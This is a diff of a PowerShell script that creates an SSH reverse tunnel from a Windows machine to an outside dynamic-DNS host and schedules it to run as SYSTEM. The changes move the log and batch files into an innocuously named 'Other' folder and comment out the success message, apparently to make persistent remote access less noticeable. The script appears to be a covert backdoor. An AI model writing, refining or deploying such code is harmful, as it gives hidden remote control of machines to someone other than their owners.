@@ -26,8 +26,14 @@ $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-$logFile = "$env:USERPROFILE\ssh_reverse_tunnel.log"
-$batFilePath = "$env:USERPROFILE\start_reverse_ssh.bat"
+$logFile = "$env:USERPROFILE\Other\ssh_reverse_tunnel.log"
+$batFilePath = "$env:USERPROFILE\Other\start_reverse_ssh.bat"
+
+# Create Other directory if not exists
+$otherDir = "$env:USERPROFILE\Other"
+if (-not (Test-Path $otherDir)) {
+    mkdir $otherDir -Force | Out-Null
+}
 
 # Create SSH key pair if not exists
 if (-not (Test-Path $keyFile)) {
@@ -72,4 +78,4 @@ if (-not $taskExists) {
         /ru "SYSTEM"
 }
 
-Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
+#Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
